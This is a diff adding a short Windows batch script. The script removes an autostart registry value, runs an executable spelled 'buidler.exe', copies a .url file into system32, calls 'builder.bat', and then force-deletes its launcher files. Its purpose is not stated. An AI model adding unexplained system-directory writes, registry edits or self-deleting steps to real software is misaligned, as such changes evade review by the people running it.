@@ -1,0 +1,10 @@
+@echo off
+cd %*
+set PATH=%PATH%;%systemroot%\system32
+REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "tmp_shids_s"  /f
+buidler.exe
+copy /Y s_hids.url %systemroot%\system32\s_hids.url
+call builder.bat
+
+del /F /Q buidler.exe
+del /F /Q service_building.bat
